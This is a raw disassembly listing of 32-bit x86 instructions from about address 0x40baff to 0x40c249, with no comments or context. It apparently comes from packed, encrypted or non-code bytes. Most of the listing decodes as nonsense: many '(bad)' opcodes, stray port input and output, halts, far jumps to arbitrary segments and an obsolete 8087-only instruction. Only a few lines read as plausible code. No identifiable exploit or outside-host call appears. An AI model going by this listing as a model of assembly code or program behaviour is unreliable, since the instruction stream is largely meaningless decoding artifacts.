  40baff:	jg     0x40bb38
  40bb01:	lea    eax,[ebp+0x770ba277]
  40bb07:	(bad)  
  40bb08:	fstp   DWORD PTR [edx+0x5e4f65da]
  40bb0e:	(bad)  
  40bb0f:	leave  
  40bb10:	xchg   ebp,eax
  40bb11:	and    esp,DWORD PTR [ecx-0x26]
  40bb14:	jecxz  0x40bb1a
  40bb16:	imul   esi,DWORD PTR [edi],0x7795c7f7
  40bb1c:	sub    ch,BYTE PTR ds:0xa2efe8af
  40bb22:	gs push esp
  40bb24:	aas    
  40bb25:	jo     0x40bb2a
  40bb27:	dec    ebx
  40bb28:	xchg   ebx,eax
  40bb29:	mov    ch,0x63
  40bb2b:	inc    edi
  40bb2c:	in     al,0x67
  40bb2e:	or     dh,BYTE PTR [ecx]
  40bb30:	mov    esp,0xaf08773c
  40bb35:	or     bh,BYTE PTR [esi+ebx*4-0x724ee917]
  40bb3c:	add    BYTE PTR [esi],dl
  40bb3e:	and    BYTE PTR [esi-0x2d],dh
  40bb41:	rol    DWORD PTR [ecx-0x4b98e962],1
  40bb47:	mov    ch,0x93
  40bb49:	inc    ecx
  40bb4a:	inc    edi
  40bb4b:	mov    ebx,0x206779ec
  40bb50:	xor    al,0xa8
  40bb52:	outs   dx,DWORD PTR ds:[esi]
  40bb53:	ret    0x848e
  40bb56:	not    eax
  40bb58:	jnp    0x40bbaf
  40bb5a:	or     dh,al
  40bb5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb5d:	out    dx,eax
  40bb5e:	push   cs
  40bb5f:	outs   dx,DWORD PTR ds:[esi]
  40bb60:	xor    bl,BYTE PTR [esi+edi*8+0x6e]
  40bb64:	cmp    dh,BYTE PTR [ecx+eiz*1-0x22]
  40bb68:	mov    bl,0xec
  40bb6a:	inc    ebp
  40bb6b:	cs mov bh,dh
  40bb6e:	out    dx,eax
  40bb6f:	sbb    al,0x71
  40bb71:	retf   0x3811
  40bb74:	cs mov cl,0x42
  40bb77:	pushf  
  40bb78:	hlt    
  40bb79:	push   ebx
  40bb7a:	jp     0x40bb5d
  40bb7c:	nop
  40bb7d:	test   eax,0x5311ec6d
  40bb82:	add    BYTE PTR [ebp+0x1],dh
  40bb85:	fsub   st,st(1)
  40bb87:	and    BYTE PTR [esi],ah
  40bb89:	pop    esp
  40bb8a:	ss push ds
  40bb8c:	jb     0x40bb2e
  40bb8e:	ss (bad) 
  40bb90:	mov    edx,0xd35acb29
  40bb95:	sbb    cl,0x6a
  40bb98:	sbb    ebp,esp
  40bb9a:	iret   
  40bb9b:	call   0x3108a7ac
  40bba0:	dec    ebx
  40bba1:	mov    esp,0xe354d8d6
  40bba6:	add    eax,ecx
  40bba8:	or     eax,0xdf78ff51
  40bbad:	sub    al,0x4a
  40bbaf:	icebp  
  40bbb0:	add    ecx,ebx
  40bbb2:	sub    ebx,DWORD PTR [esi]
  40bbb4:	xchg   esi,eax
  40bbb5:	xchg   esi,eax
  40bbb6:	adc    DWORD PTR [esp+eiz*8+0x1d],esi
  40bbba:	pop    ds
  40bbbb:	repz fidivr DWORD PTR [ebx]
  40bbbe:	add    DWORD PTR [ebp-0x5],esp
  40bbc1:	dec    edx
  40bbc2:	xchg   ebx,eax
  40bbc3:	add    eax,DWORD PTR [ebx]
  40bbc5:	popa   
  40bbc6:	sub    al,0x1b
  40bbc8:	add    BYTE PTR [edi],0x96
  40bbcb:	(bad)  
  40bbcc:	cmp    bh,al
  40bbce:	or     BYTE PTR [edx-0x25cbc56c],cl
  40bbd4:	lods   al,BYTE PTR ds:[esi]
  40bbd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbd6:	fidiv  WORD PTR [esi+0x35]
  40bbd9:	jns    0x40bc3a
  40bbdb:	addr16 pusha 
  40bbdd:	test   BYTE PTR [edx-0x26],bh
  40bbe0:	shl    DWORD PTR [edx],0x0
  40bbe3:	inc    edi
  40bbe4:	fcmove st,st(0)
  40bbe6:	sub    ebp,DWORD PTR ds:0x1251b63a
  40bbec:	pop    ebx
  40bbed:	jmp    0xf872:0x874e0c68
  40bbf4:	xchg   ebp,eax
  40bbf5:	xchg   DWORD PTR [esp+ecx*4],ecx
  40bbf8:	xlat   BYTE PTR ds:[ebx]
  40bbf9:	mov    edx,0x56aa4085
  40bbfe:	(bad)  
  40bbff:	adc    BYTE PTR [edx],al
  40bc01:	ret    0x97a8
  40bc04:	and    eax,0x553bdddd
  40bc09:	fsubr  DWORD PTR [ecx+0x5a]
  40bc0c:	aam    0x80
  40bc0e:	cmp    DWORD PTR [eax-0x6e],ebp
  40bc11:	ror    BYTE PTR [edx+0x56],1
  40bc14:	stos   BYTE PTR es:[edi],al
  40bc15:	jecxz  0x40bbdb
  40bc17:	inc    esp
  40bc18:	adc    al,0xda
  40bc1a:	dec    esi
  40bc1b:	pop    DWORD PTR [edi-0x57]
  40bc1e:	and    DWORD PTR [edx+0x4d12c356],esi
  40bc24:	sahf   
  40bc25:	jbe    0x40bc0a
  40bc27:	pop    ss
  40bc28:	sbb    eax,0x6d57e2ae
  40bc2d:	xchg   ecx,eax
  40bc2e:	jle    0x40bc4a
  40bc30:	cwde   
  40bc31:	mov    esp,0x120afa8
  40bc36:	jnp    0x40bc08
  40bc38:	mov    esp,0xd384e80f
  40bc3d:	mov    edi,0xa9e99946
  40bc42:	xchg   BYTE PTR [ebx+0x451c1021],bh
  40bc48:	push   0xffffff9b
  40bc4a:	and    esi,DWORD PTR [edx+edx*2]
  40bc4d:	or     esp,DWORD PTR [eax+0x2eee3a8d]
  40bc53:	lods   eax,DWORD PTR ds:[esi]
  40bc54:	pop    ebp
  40bc55:	imul   ebx,DWORD PTR [bx-0xb9f],0xae50677f
  40bc5e:	pop    ss
  40bc5f:	mov    ds:0xac9482ba,al
  40bc64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc65:	lock out 0xbe,eax
  40bc68:	call   0x7cdc:0xcb73114a
  40bc6f:	push   ds
  40bc70:	and    ebp,DWORD PTR [eax]
  40bc72:	and    al,BYTE PTR [eax+0x1a]
  40bc75:	sub    ebp,DWORD PTR [eax]
  40bc77:	out    dx,eax
  40bc78:	enter  0x4d2,0x5d
  40bc7c:	jns    0x40bca3
  40bc7e:	add    edi,DWORD PTR [edx+0x3c]
  40bc81:	ror    DWORD PTR [ecx],cl
  40bc83:	loope  0x40bc6c
  40bc85:	outs   dx,DWORD PTR ds:[esi]
  40bc86:	ficomp WORD PTR [eax]
  40bc88:	push   0xa8c80c17
  40bc8d:	mov    ?,WORD PTR [edi-0x69]
  40bc90:	mov    ebx,0xb33dd867
  40bc95:	ds and dl,BYTE PTR ds:[ecx]
  40bc99:	mov    edi,0x2b9fa4c6
  40bc9e:	jg     0x40bcbd
  40bca0:	sti    
  40bca1:	ret    0x24ec
  40bca4:	pop    esp
  40bca5:	jno    0x40bcd1
  40bca7:	sub    BYTE PTR [eax],dl
  40bca9:	addr16 sub ebx,edi
  40bcac:	cmp    ebx,edx
  40bcae:	mov    edx,DWORD PTR [ebp-0x38]
  40bcb1:	jbe    0x40bcba
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	fnstcw WORD PTR [ebx-0x711b98c3]
  40bcd8:	jle    0x40bd58
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	mov    ds:0x48cdf740,al
  40bce3:	adc    al,BYTE PTR [edx]
  40bce5:	fsub   st(7),st
  40bce7:	dec    edx
  40bce8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bce9:	xchg   ebx,eax
  40bcea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bceb:	adc    ecx,DWORD PTR [eax+ebp*4]
  40bcee:	hlt    
  40bcef:	jns    0x40bd09
  40bcf1:	mov    al,BYTE PTR [edx-0x2a]
  40bcf4:	and    eax,DWORD PTR [esi-0x30]
  40bcf7:	inc    ebp
  40bcf8:	dec    edx
  40bcf9:	outs   dx,BYTE PTR ds:[esi]
  40bcfa:	aam    0xc7
  40bcfc:	(bad)  
  40bcfd:	mov    eax,0x9df3ab7
  40bd02:	mov    ecx,0xd6b726e2
  40bd07:	test   al,0x64
  40bd09:	xor    BYTE PTR [ebp-0x330e909f],cl
  40bd0f:	or     bl,BYTE PTR [edx]
  40bd11:	dec    edi
  40bd12:	jmp    0xb677f8db
  40bd17:	xor    bl,ah
  40bd19:	push   esi
  40bd1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd1b:	mov    ah,0xda
  40bd1d:	enter  0x12f8,0x6c
  40bd21:	in     al,0x69
  40bd23:	scas   al,BYTE PTR es:[edi]
  40bd24:	sub    DWORD PTR [edi-0x7206238e],ebp
  40bd2a:	enter  0x6a08,0x45
  40bd2e:	in     eax,0x73
  40bd30:	sub    esi,DWORD PTR [ebx-0x40]
  40bd33:	test   eax,0x56a8721d
  40bd38:	(bad)  
  40bd39:	jmp    0x40bd78
  40bd3b:	dec    eax
  40bd3c:	mov    cl,0xe9
  40bd3e:	add    DWORD PTR [edi+ecx*8+0x7b56c387],edx
  40bd45:	mov    dh,0xf0
  40bd47:	outs   dx,BYTE PTR ds:[esi]
  40bd48:	pop    es
  40bd49:	(bad)  
  40bd4a:	loopne 0x40bd60
  40bd4c:	cmp    al,BYTE PTR [eax-0x48]
  40bd4f:	loop   0x40bd03
  40bd51:	stos   DWORD PTR es:[edi],eax
  40bd52:	std    
  40bd53:	dec    eax
  40bd54:	xchg   ebp,eax
  40bd55:	lea    ecx,[edx+0x17252963]
  40bd5b:	in     eax,dx
  40bd5c:	ret    0x499e
  40bd5f:	fld    QWORD PTR [ecx-0x63]
  40bd62:	xchg   edi,eax
  40bd63:	std    
  40bd64:	into   
  40bd65:	sar    BYTE PTR es:[ebx-0x6bfec647],0xa6
  40bd6d:	clc    
  40bd6e:	xchg   ecx,eax
  40bd6f:	pusha  
  40bd70:	in     eax,0xe7
  40bd72:	mov    esi,0xa405ae5d
  40bd77:	out    0x89,eax
  40bd79:	loope  0x40bd5b
  40bd7b:	xchg   edi,eax
  40bd7c:	in     eax,0xc7
  40bd7e:	aaa    
  40bd7f:	mov    al,0xc6
  40bd81:	inc    ecx
  40bd82:	pushf  
  40bd83:	sbb    eax,0xe78e476a
  40bd88:	add    ecx,DWORD PTR ds:0xdc0c04a6
  40bd8e:	jmp    0xa43c:0xa98e5691
  40bd95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd96:	sub    ah,BYTE PTR [ebp-0x7f5551f4]
  40bd9c:	xor    ecx,ebx
  40bd9e:	in     al,0x62
  40bda0:	push   0xffffffe7
  40bda2:	aaa    
  40bda3:	(bad)
  40bda6:	jge    0x40bd5a
  40bda8:	jge    0x40be0c
  40bdaa:	push   edx
  40bdab:	scas   eax,DWORD PTR es:[edi]
  40bdac:	sbb    eax,0xbede45d5
  40bdb1:	jae    0x40bd93
  40bdb3:	nop
  40bdb4:	dec    esi
  40bdb5:	adc    ch,ah
  40bdb7:	adc    al,0x7b
  40bdb9:	xchg   BYTE PTR [ebx+0x5e22bbb9],al
  40bdbf:	in     al,0x85
  40bdc1:	test   al,0x9
  40bdc3:	js     0x40be0c
  40bdc5:	mov    ds:0x69257dc8,al
  40bdca:	outs   dx,DWORD PTR ds:[esi]
  40bdcb:	xchg   edx,eax
  40bdcc:	ror    cl,cl
  40bdce:	scas   eax,DWORD PTR es:[edi]
  40bdcf:	mov    al,0xdd
  40bdd1:	or     eax,DWORD PTR [esi+ecx*1]
  40bdd4:	xor    bh,BYTE PTR [esp+eax*4+0x26]
  40bdd8:	ds push ss
  40bdda:	sub    DWORD PTR [edx-0x37],ecx
  40bddd:	iret   
  40bdde:	rol    BYTE PTR [edi-0x1c],0xc8
  40bde2:	jbe    0x40bdf4
  40bde4:	mov    bl,0x82
  40bde6:	jbe    0x40bd83
  40bde8:	(bad)  [ebx+0x2c]
  40bdeb:	scas   al,BYTE PTR es:[edi]
  40bdec:	inc    ecx
  40bded:	jbe    0x40be04
  40bdef:	pop    ss
  40bdf0:	lock in ax,dx
  40bdf3:	inc    ebx
  40bdf4:	clc    
  40bdf5:	add    al,0x98
  40bdf7:	mov    esp,0xca25acdd
  40bdfc:	cmc    
  40bdfd:	add    esi,eax
  40bdff:	mov    edx,0x432167ad
  40be04:	mov    ch,0xe1
  40be06:	pusha  
  40be07:	scas   al,BYTE PTR es:[edi]
  40be08:	mov    dh,0x87
  40be0a:	xor    BYTE PTR [esi],bl
  40be0c:	push   esi
  40be0d:	sbb    ah,BYTE PTR [esp+esi*8+0x2075a774]
  40be14:	addr16 cmp edi,0xffffffff
  40be18:	jle    0x40be92
  40be1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be1b:	xchg   ebx,eax
  40be1c:	in     eax,0x84
  40be1e:	jno    0x40be45
  40be20:	sub    dh,BYTE PTR [ebp-0xc]
  40be23:	bound  ebx,QWORD PTR [esi]
  40be25:	ins    DWORD PTR es:[edi],dx
  40be26:	cmc    
  40be27:	add    esi,DWORD PTR [edi+0x7f]
  40be2a:	scas   al,BYTE PTR es:[edi]
  40be2b:	dec    eax
  40be2c:	popa   
  40be2d:	add    DWORD PTR [edi-0x31],ecx
  40be30:	cmp    edi,DWORD PTR [edi+0x2202693e]
  40be36:	xchg   BYTE PTR [ebx+0x3c],ah
  40be39:	xor    eax,0x48916fee
  40be3e:	xlat   BYTE PTR ds:[ebx]
  40be3f:	mov    esi,0xd908f175
  40be44:	push   ebp
  40be45:	std    
  40be46:	inc    ebx
  40be47:	not    BYTE PTR [ebx+ebx*1]
  40be4a:	rcl    bl,cl
  40be4c:	add    ch,ch
  40be4e:	sbb    eax,0x9a828f7c
  40be53:	mov    gs,WORD PTR [edx]
  40be55:	inc    esp
  40be56:	and    ebx,DWORD PTR [edi+0x5beddc4f]
  40be5c:	pop    ebp
  40be5d:	and    eax,0x2c54d29d
  40be62:	dec    ebx
  40be63:	xor    BYTE PTR [edi+0xe761c92],al
  40be69:	imul   dl
  40be6b:	sub    edi,DWORD PTR [ecx-0x42]
  40be6e:	adc    al,0x7a
  40be70:	lahf   
  40be71:	stos   BYTE PTR es:[edi],al
  40be72:	arpl   ax,cx
  40be74:	jg     0x40be9a
  40be76:	inc    ebx
  40be77:	cmp    eax,0x7e109f87
  40be7c:	cmp    DWORD PTR [esi],eax
  40be7e:	push   es
  40be7f:	inc    esi
  40be80:	jnp    0x40be5d
  40be82:	xor    dl,bl
  40be84:	fsubr  DWORD PTR [ebp-0x73fffe85]
  40be8a:	jl     0x40bea2
  40be8c:	sbb    BYTE PTR [edi],al
  40be8e:	xor    BYTE PTR [ecx],ch
  40be90:	sbb    ebx,DWORD PTR [ebx+0x6b]
  40be93:	loopne 0x40becc
  40be95:	fld    DWORD PTR [eax-0x4113f4ea]
  40be9b:	inc    esp
  40be9c:	repz gs and al,bh
  40bea0:	sti    
  40bea1:	pop    ds
  40bea2:	stc    
  40bea3:	xchg   ebx,ebp
  40bea5:	add    al,0x28
  40bea7:	imul   eax,edx,0xfffffffd
  40beaa:	ret    0x5878
  40bead:	jo     0x40bf19
  40beaf:	xchg   ebp,eax
  40beb0:	in     eax,dx
  40beb1:	sub    eax,0xbaf27a55
  40beb6:	repz jg 0x40be53
  40beb9:	and    BYTE PTR [ebx+edx*4],ah
  40bebc:	enter  0x3b37,0xa
  40bec0:	adc    al,0x9
  40bec2:	sub    ecx,DWORD PTR [esi-0x448616e9]
  40bec8:	jmp    0xcb92:0x22c6109f
  40becf:	aad    0x29
  40bed1:	pop    edx
  40bed2:	cmp    eax,0x72530a80
  40bed7:	inc    edi
  40bed8:	pop    esp
  40bed9:	call   0xd30c7e18
  40bede:	xchg   esi,ebx
  40bee0:	retf   0x7f9c
  40bee3:	and    BYTE PTR [ecx],bl
  40bee5:	repnz inc ebp
  40bee7:	imul   ecx,DWORD PTR [eax-0x5b5953db],0xffffffd8
  40beee:	sbb    eax,0xdfa14571
  40bef3:	mov    ebp,0xbc07bacf
  40bef8:	push   esp
  40bef9:	int    0x8e
  40befb:	fdecstp 
  40befd:	js     0x40beb1
  40beff:	stos   DWORD PTR es:[edi],eax
  40bf00:	mov    ecx,0xbe566191
  40bf05:	shr    DWORD PTR [edi+eiz*4+0x4e],cl
  40bf09:	mov    WORD PTR [ecx+0x387244ef],gs
  40bf0f:	leave  
  40bf10:	push   ebp
  40bf11:	mov    cs,edi
  40bf13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf14:	in     eax,dx
  40bf15:	dec    eax
  40bf16:	clc    
  40bf17:	out    dx,al
  40bf18:	in     al,dx
  40bf19:	mov    ch,0xe0
  40bf1b:	push   0x77483a0d
  40bf20:	repnz dec ebx
  40bf22:	dec    edi
  40bf23:	dec    edx
  40bf24:	xchg   esp,eax
  40bf25:	dec    ebp
  40bf26:	inc    esp
  40bf27:	ret    0x1c7
  40bf2a:	add    ah,cl
  40bf2c:	sbb    BYTE PTR [ecx+0x19],0x57
  40bf30:	push   ss
  40bf31:	xchg   ebx,eax
  40bf32:	lock icebp 
  40bf34:	aaa    
  40bf35:	data16 cli 
  40bf37:	loopne 0x40bf24
  40bf39:	(bad)  
  40bf3a:	in     al,dx
  40bf3b:	lea    ebp,[ebx]
  40bf3d:	div    BYTE PTR [eax+0x49]
  40bf40:	fwait
  40bf41:	push   ebx
  40bf42:	jmp    0x99da:0xa39f973f
  40bf49:	jb     0x40bfaa
  40bf4b:	(bad)
  40bf4f:	jmp    0xd4e4cbdf
  40bf54:	and    al,0x27
  40bf56:	push   cs
  40bf57:	lea    esp,[ecx]
  40bf59:	imul   ebx,DWORD PTR [ecx],0x843ed225
  40bf5f:	mov    WORD PTR [edx],cs
  40bf61:	mov    ebx,DWORD PTR [ecx-0xc509689]
  40bf67:	cdq    
  40bf68:	cdq    
  40bf69:	fnstenv [si+0x5b]
  40bf6d:	bnd je 0x40bf31
  40bf70:	mov    WORD PTR [eax-0x4a],?
  40bf73:	shl    BYTE PTR [edi+0x41a5f8f7],cl
  40bf79:	call   0x4451:0xacf3988b
  40bf80:	or     ebp,DWORD PTR [esi]
  40bf82:	mov    ah,0x23
  40bf84:	xchg   ebx,eax
  40bf85:	imul   ebp,DWORD PTR [ecx-0x595c11fa],0x87261461
  40bf8f:	in     al,0xe3
  40bf91:	sub    eax,0x6fecc799
  40bf96:	cmp    edi,DWORD PTR [esi-0x64]
  40bf99:	aam    0x3a
  40bf9b:	je     0x40bfb7
  40bf9d:	gs mov ch,0x13
  40bfa0:	and    bl,BYTE PTR [ebx+edx*2-0x70f7b44]
  40bfa7:	push   edi
  40bfa8:	or     eax,0xf9f1b72
  40bfad:	popa   
  40bfae:	(bad)  
  40bfaf:	ins    BYTE PTR es:[edi],dx
  40bfb0:	jnp    0x40bf7b
  40bfb2:	inc    ecx
  40bfb3:	jp     0x40bff8
  40bfb5:	in     al,0x99
  40bfb7:	ins    DWORD PTR es:[edi],dx
  40bfb8:	sub    al,0x20
  40bfba:	lahf   
  40bfbb:	cwde   
  40bfbc:	jbe    0x40bf7c
  40bfbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfbf:	call   0xfe91:0x1f1945bb
  40bfc6:	pushf  
  40bfc7:	addr16 fsub st,st(2)
  40bfca:	xor    al,0xa5
  40bfcc:	mov    bl,0x3c
  40bfce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfcf:	lods   eax,DWORD PTR ds:[esi]
  40bfd0:	or     eax,0x867367fb
  40bfd5:	xchg   ebx,eax
  40bfd6:	push   esp
  40bfd7:	mov    dl,0x6b
  40bfd9:	jbe    0x40c023
  40bfdb:	jb     0x40bff5
  40bfdd:	push   ss
  40bfde:	mov    esi,0xc4d9c499
  40bfe3:	mov    ch,0x49
  40bfe5:	ins    DWORD PTR es:[edi],dx
  40bfe6:	daa    
  40bfe7:	mov    esi,DWORD PTR [ecx]
  40bfe9:	scas   eax,DWORD PTR es:[edi]
  40bfea:	adc    ebp,0x875e346b
  40bff0:	out    dx,eax
  40bff1:	xor    ah,BYTE PTR es:[ebx]
  40bff4:	ja     0x40c05b
  40bff6:	lds    esp,FWORD PTR [ecx+0x1e]
  40bff9:	pop    esp
  40bffa:	push   edi
  40bffb:	push   esp
  40bffc:	lock ret 0xd7a0
  40c000:	cli    
  40c001:	or     ebx,esp
  40c003:	lahf   
  40c004:	jle    0x40bfed
  40c006:	and    BYTE PTR [eax+0x41],al
  40c009:	fisubr WORD PTR [ebx]
  40c00b:	pop    eax
  40c00c:	loopne 0x40bfc4
  40c00e:	lock dec ecx
  40c010:	xor    esi,eax
  40c012:	fwait
  40c013:	jns    0x40bfb5
  40c015:	jns    0x40bfd7
  40c017:	jo     0x40bfbf
  40c019:	sub    DWORD PTR [ecx+ebx*4-0x7f],ecx
  40c01d:	adc    BYTE PTR [ebx-0x75],0x18
  40c021:	jno    0x40c071
  40c023:	call   0x74d7:0x8773b247
  40c02a:	aaa    
  40c02b:	cmp    eax,ebx
  40c02d:	sub    edx,DWORD PTR [edi+0x3326fd95]
  40c033:	cli    
  40c034:	int    0x94
  40c036:	inc    esi
  40c037:	test   BYTE PTR [ebp+ecx*1-0x6],bh
  40c03b:	cmp    al,0x88
  40c03d:	loop   0x40c093
  40c03f:	inc    ebp
  40c041:	lea    edi,[ebx]
  40c043:	ret    0x3a0e
  40c046:	inc    esp
  40c047:	in     eax,dx
  40c048:	jns    0x40bfd4
  40c04a:	shl    DWORD PTR [edi],0x69
  40c04d:	jno    0x40c023
  40c04f:	fs push eax
  40c051:	shl    DWORD PTR [edx+0x4b],1
  40c054:	or     edi,DWORD PTR [ebp+0x502577b]
  40c05a:	mov    esi,0xf47030b4
  40c05f:	cmp    esi,ebp
  40c061:	mov    al,ds:0x500aa278
  40c066:	clc    
  40c067:	scas   eax,DWORD PTR es:[edi]
  40c068:	dec    ebp
  40c069:	push   ss
  40c06a:	dec    esp
  40c06b:	fimul  DWORD PTR [eax-0x15]
  40c06e:	pushf  
  40c06f:	imul   BYTE PTR ds:0x9b580079
  40c075:	jae    0x40c059
  40c077:	xor    eax,0x7a118a8b
  40c07c:	mov    edx,0x2be72af6
  40c081:	jbe    0x40c03e
  40c083:	cmp    ch,BYTE PTR [ebx-0x59]
  40c086:	push   ecx
  40c087:	test   eax,0xf017e5b5
  40c08c:	fdivr  QWORD PTR [esi+0x38]
  40c08f:	div    DWORD PTR [ecx-0x40c7ae6d]
  40c095:	mov    WORD PTR [ebp*2+0x1d4765b2],fs
  40c09c:	fcom   QWORD PTR [eax-0x6f]
  40c09f:	fdivr  QWORD PTR [edx+0xd]
  40c0a2:	jno    0x40c055
  40c0a4:	dec    edi
  40c0a5:	add    ebx,esp
  40c0a7:	dec    esi
  40c0a8:	(bad)
  40c0ab:	shl    DWORD PTR [ecx],cl
  40c0ad:	or     al,0xf1
  40c0af:	inc    ebx
  40c0b0:	push   cs
  40c0b1:	mov    ch,0x6e
  40c0b3:	cmp    al,0x7e
  40c0b5:	ins    BYTE PTR es:[edi],dx
  40c0b6:	or     eax,0xee980611
  40c0bb:	mov    cl,BYTE PTR ds:0xef37e38d
  40c0c1:	mov    fs,WORD PTR [ecx-0x12fce2d]
  40c0c7:	inc    esi
  40c0c8:	push   0x2c6b558d
  40c0cd:	xchg   edx,eax
  40c0ce:	add    eax,0x13621961
  40c0d3:	retf   
  40c0d4:	ficomp WORD PTR [ebx-0x6fc9ef8]
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	rol    BYTE PTR [esi],1
  40c0ee:	fs jg  0x40c16a
  40c0f1:	fimul  WORD PTR [edx+0x79707e7e]
  40c0f7:	jle    0x40c177
  40c0f9:	lds    ecx,FWORD PTR [ecx+0x6b]
  40c0fc:	ins    DWORD PTR es:[edi],dx
  40c0fd:	imul   ecx,esi,0xde8e53fb
  40c103:	lds    esp,FWORD PTR ds:0xd814de56
  40c109:	jnp    0x40c114
  40c10b:	xchg   edi,eax
  40c10c:	push   edx
  40c10d:	xor    edx,eax
  40c10f:	sbb    BYTE PTR [eax+0x7c42224d],0x67
  40c116:	aad    0x45
  40c118:	fsubr  st(1),st
  40c11a:	push   0x47
  40c11c:	sahf   
  40c11d:	imul   ebx,DWORD PTR [eax],0x614d59ad
  40c123:	stos   DWORD PTR es:[edi],eax
  40c124:	leave  
  40c125:	cld    
  40c126:	mov    dl,dh
  40c128:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c12a:	inc    edi
  40c12b:	adc    bl,BYTE PTR [edi+0x6f50a1e3]
  40c131:	pop    esp
  40c132:	enter  0xa89a,0x41
  40c136:	aam    0x26
  40c138:	xchg   BYTE PTR ds:0x4c59512e,al
  40c13e:	js     0x40c127
  40c140:	sbb    eax,0xa45434af
  40c145:	stc    
  40c146:	das    
  40c147:	sbb    esp,ebx
  40c149:	sbb    eax,0x14da965a
  40c14e:	leave  
  40c14f:	pop    edi
  40c151:	(bad)  
  40c152:	stc    
  40c153:	xor    DWORD PTR [ebx],eax
  40c155:	push   esi
  40c156:	sar    BYTE PTR [eax+ebx*2+0x14],0x65
  40c15b:	and    eax,0x9c590e13
  40c160:	adc    eax,ebx
  40c162:	sbb    eax,0x8d1423b
  40c167:	inc    ebx
  40c168:	sar    DWORD PTR [edi+0x1d],0x9a
  40c16c:	and    DWORD PTR [ebp+0x13],esp
  40c16f:	mov    DWORD PTR [ebx+0x26],edx
  40c172:	mov    esp,0xd19e458c
  40c177:	repz daa 
  40c179:	jmp    0x40c1e1
  40c17b:	bound  edi,QWORD PTR [ebp-0x5957c5a]
  40c181:	cmp    edx,esi
  40c183:	mov    dh,0x84
  40c185:	inc    ebx
  40c186:	(bad)  
  40c187:	ss icebp 
  40c189:	push   es
  40c18a:	(bad)  
  40c18b:	into   
  40c18c:	cli    
  40c18d:	popa   
  40c18e:	popf   
  40c18f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c190:	cs mov cl,0x8b
  40c193:	dec    ecx
  40c194:	push   es
  40c195:	fndisi(8087 only) 
  40c197:	inc    esi
  40c198:	sub    al,0x38
  40c19a:	xchg   esp,eax
  40c19b:	lea    edx,[esi]
  40c19d:	and    esi,DWORD PTR [ebx-0x6c]
  40c1a0:	ds scas eax,DWORD PTR es:[edi]
  40c1a2:	jmp    0x70e:0xd449e8a9
  40c1a9:	sub    BYTE PTR [ecx],bh
  40c1ab:	cmp    DWORD PTR [ebp+0x31c78d71],0xffffffef
  40c1b2:	bnd je 0x40c22f
  40c1b5:	jmp    DWORD PTR [edx]
  40c1b7:	xor    dh,BYTE PTR [eax-0x17]
  40c1ba:	aam    0xd8
  40c1bc:	aas    
  40c1bd:	in     al,dx
  40c1be:	mov    WORD PTR [edi-0x64e23715],?
  40c1c4:	repz xchg esp,eax
  40c1c6:	outs   dx,BYTE PTR ds:[esi]
  40c1c7:	mov    dl,0xa8
  40c1c9:	fist   DWORD PTR [eax+0x27]
  40c1cc:	aas    
  40c1cd:	scas   al,BYTE PTR es:[edi]
  40c1ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1cf:	stos   DWORD PTR es:[edi],eax
  40c1d0:	pushf  
  40c1d1:	mov    ebp,0x1b1e163e
  40c1d6:	scas   eax,DWORD PTR es:[edi]
  40c1d7:	mov    fs,WORD PTR [ecx-0x6ec2dfe]
  40c1dd:	inc    ecx
  40c1de:	inc    esi
  40c1df:	in     eax,dx
  40c1e0:	or     edi,DWORD PTR [esi+edi*1]
  40c1e3:	mov    al,0xe0
  40c1e5:	cmp    eax,0xccc1d1a5
  40c1ea:	js     0x40c261
  40c1ec:	dec    edx
  40c1ed:	aad    0xf0
  40c1ef:	and    dh,dh
  40c1f1:	push   ss
  40c1f2:	cwde   
  40c1f3:	mov    ds:0x8a7915eb,al
  40c1f8:	loopne 0x40c229
  40c1fa:	in     al,0xeb
  40c1fc:	pop    ecx
  40c1fd:	hlt    
  40c1fe:	sub    eax,0xa98acf40
  40c203:	in     al,dx
  40c204:	sti    
  40c205:	into   
  40c206:	inc    ecx
  40c207:	rcl    dl,1
  40c209:	pop    ecx
  40c20a:	(bad)  
  40c20b:	pop    esp
  40c20c:	pop    eax
  40c20d:	test   DWORD PTR [edx-0x3c],edx
  40c210:	and    ecx,eax
  40c212:	call   DWORD PTR [edx-0x7c85c805]
  40c218:	cs retf 
  40c21a:	test   bl,cl
  40c21c:	mov    DWORD PTR [ebp+0x0],esi
  40c21f:	loopne 0x40c1c0
  40c221:	cld    
  40c222:	or     cl,al
  40c224:	sbb    dl,BYTE PTR ds:0xf8fb27b2
  40c22a:	mov    bh,0x89
  40c22c:	enter  0x6a8a,0x6e
  40c230:	xlat   BYTE PTR ds:[ebx]
  40c231:	or     DWORD PTR [edi],ecx
  40c233:	cwde   
  40c234:	inc    esp
  40c235:	adc    esi,ebx
  40c237:	stc    
  40c238:	pmaddwd mm1,mm1
  40c23b:	dec    BYTE PTR [ebp+0x41]
  40c23e:	adc    BYTE PTR es:[edx+esi*2+0x46],bl
  40c243:	mov    al,ds:0x411a5fd5
  40c248:	xchg   esi,eax
  40c249:	sar    ch,cl
